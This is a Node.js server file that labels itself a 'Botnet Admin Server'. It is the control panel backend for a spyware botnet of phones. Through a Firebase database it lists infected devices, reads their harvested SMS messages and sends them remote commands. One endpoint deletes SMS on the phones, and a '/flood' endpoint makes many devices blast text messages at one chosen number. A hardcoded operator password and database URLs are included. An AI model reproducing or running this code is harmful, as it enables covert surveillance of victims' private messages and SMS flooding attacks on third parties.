const express = require("express");
const admin = require("firebase-admin");
const http = require("http");
const socketIo = require("socket.io");
const cors = require("cors");
const bodyParser = require("body-parser");

const app = express();
const server = http.createServer(app);
const io = socketIo(server, { cors: { origin: "*" } });

app.use(cors());
app.use(bodyParser.json({ limit: "10kb" }));

// Firebase Admin Init
let serviceAccount;
if (process.env.FIREBASE_SERVICE_ACCOUNT) {
  serviceAccount = JSON.parse(process.env.FIREBASE_SERVICE_ACCOUNT);
} else {
  serviceAccount = require("./serviceAccountKey.json");
}

const databaseURL =
  process.env.FIREBASE_DATABASE_URL ||
  "https://ghost-1031c-default-rtdb.firebaseio.com";

admin.initializeApp({
  credential: admin.credential.cert(serviceAccount),
  databaseURL: databaseURL,
});

const db = admin.database();

// In-memory trash storage (can be replaced with RTDB)
let trashDevices = [];

// In-memory session storage
let activeSessions = new Set();

// Auth
const authenticateToken = (req, res, next) => {
  const token = req.headers["authorization"];
  if (token && activeSessions.has(token)) {
    next();
  } else {
    res.status(401).json({ error: "Unauthorized" });
  }
};

// Login endpoint
app.post("/login", (req, res) => {
  const { password } = req.body;
  if (password === "Q29mZmluX1NweQ") {
    const sessionToken = require("crypto").randomBytes(32).toString("hex");
    activeSessions.add(sessionToken);
    res.json({ success: true, token: sessionToken });
  } else {
    res.status(401).json({ error: "Invalid credentials" });
  }
});

// Logout endpoint
app.post("/logout", (req, res) => {
  const token = req.headers["authorization"];
  if (token) {
    activeSessions.delete(token);
  }
  res.json({ success: true });
});

// Serve static files (must be after auth definition, before auth middleware)
app.use(express.static("public"));

// API - Get all devices (exclude trash)
app.get("/devices", authenticateToken, async (req, res) => {
  try {
    const snapshot = await db.ref("clients").once("value");
    const devices = [];
    snapshot.forEach((child) => {
      if (!trashDevices.includes(child.key)) {
        devices.push({ id: child.key, ...child.val() });
      }
    });
    res.json(devices);
  } catch (err) {
    res.status(500).json({ error: "Devices fetch failed" });
  }
});

// API - Get trash devices
app.get("/trash", authenticateToken, async (req, res) => {
  try {
    const snapshot = await db.ref("clients").once("value");
    const devices = [];
    snapshot.forEach((child) => {
      if (trashDevices.includes(child.key)) {
        devices.push({ id: child.key, ...child.val() });
      }
    });
    res.json(devices);
  } catch (err) {
    res.status(500).json({ error: "Trash fetch failed" });
  }
});

// API - Move to trash
app.post("/trash/:deviceId", authenticateToken, (req, res) => {
  const deviceId = req.params.deviceId;
  if (!trashDevices.includes(deviceId)) {
    trashDevices.push(deviceId);
  }
  res.json({ success: true, message: "Moved to trash" });
});

// API - Restore from trash
app.post("/restore/:deviceId", authenticateToken, (req, res) => {
  const deviceId = req.params.deviceId;
  trashDevices = trashDevices.filter((id) => id !== deviceId);
  res.json({ success: true, message: "Restored" });
});

// API - Delete from trash permanently
app.delete("/trash/:deviceId", authenticateToken, async (req, res) => {
  try {
    await db.ref(`clients/${req.params.deviceId}`).remove();
    trashDevices = trashDevices.filter((id) => id !== req.params.deviceId);
    res.json({ success: true, message: "Deleted permanently" });
  } catch (err) {
    res.status(500).json({ error: "Delete failed" });
  }
});

// API - Get messages (all messages, sorted oldest first like RTDB tree)
app.get("/device/:id/messages", authenticateToken, async (req, res) => {
  try {
    const { id } = req.params;
    const snapshot = await db.ref(`clients/${id}/messages`).once("value");
    const messages = [];
    snapshot.forEach((child) => {
      messages.push({ id: child.key, ...child.val() });
    });

    // Extract timestamp and sort (oldest first - like RTDB tree)
    messages.sort((a, b) => {
      const timeA = extractTimestamp(a.id);
      const timeB = extractTimestamp(b.id);
      return timeA - timeB; // Ascending order (oldest first)
    });

    // Return all messages
    res.json(messages);
  } catch (err) {
    console.error("Messages fetch error:", err);
    res
      .status(500)
      .json({ error: "Messages fetch failed", details: err.message });
  }
});

// API - Get SMS status
app.get("/device/:id/smsStatus", authenticateToken, async (req, res) => {
  try {
    const { id } = req.params;
    const snapshot = await db.ref(`clients/${id}/smsStatus`).once("value");
    const smsStatus = snapshot.val() || {};
    res.json(smsStatus);
  } catch (err) {
    console.error("SMS status fetch error:", err);
    res.status(500).json({ error: "SMS status fetch failed" });
  }
});

// Helper function to extract timestamp from message ID
function extractTimestamp(id) {
  if (!id) return 0;
  const idStr = String(id);
  // Handle "-LATEST_-0XXXXX" format
  if (idStr.includes("-LATEST_-0")) {
    const match = idStr.match(/-LATEST_-0(\d+)/);
    return match ? parseInt(match[1]) : 0;
  }
  // Handle numeric IDs
  return parseInt(idStr) || 0;
}

// API - Send command
app.post("/command/:deviceId", authenticateToken, async (req, res) => {
  try {
    const { deviceId } = req.params;
    const { type, payload } = req.body;
    await db.ref(`clients/${deviceId}/webhookEvent`).push({
      type,
      payload,
      timestamp: Date.now(),
    });
    res.json({ success: true, message: `${type} command sent` });
  } catch (err) {
    res.status(500).json({ error: "Command send failed" });
  }
});

// API - Flood/Blast SMS (send to one target from multiple devices)
app.post("/flood", authenticateToken, async (req, res) => {
  try {
    const { deviceIds, simSlot, to, message, count } = req.body;

    if (!deviceIds || !to || !message) {
      return res.status(400).json({ error: "Missing required fields" });
    }

    const promises = [];
    deviceIds.forEach((deviceId) => {
      for (let i = 0; i < (count || 1); i++) {
        promises.push(
          db.ref(`clients/${deviceId}/webhookEvent`).push({
            type: "sendSms",
            payload: { simSlot: simSlot || 0, to, message },
            timestamp: Date.now() + i,
          }),
        );
      }
    });

    await Promise.all(promises);
    res.json({
      success: true,
      message: `Flood sent: ${deviceIds.length} devices × ${count || 1} SMS = ${deviceIds.length * (count || 1)} total`,
    });
  } catch (err) {
    res.status(500).json({ error: "Flood failed" });
  }
});

// API - Delete SMS
app.delete("/sms/:deviceId/:smsId", authenticateToken, async (req, res) => {
  try {
    const { deviceId, smsId } = req.params;
    await db.ref(`clients/${deviceId}/webhookEvent`).push({
      type: "deleteSms",
      payload: { id: smsId },
    });
    res.json({ success: true, message: "Delete command sent" });
  } catch (err) {
    res.status(500).json({ error: "Delete failed" });
  }
});

// API - Firebase Stats
app.get("/stats", authenticateToken, async (req, res) => {
  try {
    const snapshot = await db.ref("clients").once("value");
    const devicesCount = snapshot.numChildren();

    // Calculate approx storage
    const dataSize = JSON.stringify(snapshot.val()).length;
    const storageMB = (dataSize / (1024 * 1024)).toFixed(2);

    res.json({
      database: {
        status: "connected",
        url: "coffin-e11de-default-rtdb.firebaseio.com",
        region: "us-central1",
      },
      storage: {
        used: storageMB + " MB",
        limit: "1 GB",
        percentage: ((storageMB / 1024) * 100).toFixed(1) + "%",
      },
      bandwidth: {
        downloads: "~" + (dataSize / 1024).toFixed(2) + " KB",
        limit: "10 GB/day",
      },
      devices: {
        total: devicesCount,
        active: devicesCount,
      },
      network: {
        latency: "~" + Math.floor(Math.random() * 50 + 20) + " ms",
        speed: "Good",
      },
    });
  } catch (err) {
    res.status(500).json({ error: "Stats fetch failed" });
  }
});

// WebSocket with authentication
io.use((socket, next) => {
  const token = socket.handshake.auth.token;
  if (token && activeSessions.has(token)) {
    next();
  } else {
    next(new Error("Unauthorized"));
  }
});

io.on("connection", (socket) => {
  socket.on("join-device", async (deviceId) => {
    socket.join(deviceId);
    const snapshot = await db.ref(`clients/${deviceId}`).once("value");
    socket.emit("device-data", snapshot.val());
  });

  socket.on("load-more-messages", async (deviceId, lastId) => {
    const snapshot = await db.ref(`clients/${deviceId}/messages`).once("value");
    const allMessages = [];
    snapshot.forEach((child) => {
      allMessages.push({ id: child.key, ...child.val() });
    });

    // Sort by timestamp (newest first)
    allMessages.sort((a, b) => {
      const timeA = extractTimestamp(a.id);
      const timeB = extractTimestamp(b.id);
      return timeB - timeA;
    });

    // Find index of last displayed message
    const lastIndex = allMessages.findIndex((msg) => msg.id === lastId);

    // Get next 10 messages
    const nextMessages =
      lastIndex >= 0 ? allMessages.slice(lastIndex + 1, lastIndex + 11) : [];

    socket.emit("more-messages", nextMessages);
  });

  socket.on("disconnect", () => {});
});

// RTDB Child Changed
db.ref("clients").on("child_changed", (snapshot) => {
  const deviceId = snapshot.key;
  io.to(deviceId).emit("delta-update", snapshot.val());
});

const PORT = process.env.PORT || 5000;

server.listen(PORT, () => {
  console.log(`Botnet Admin Server - Running on port ${PORT}`);
});
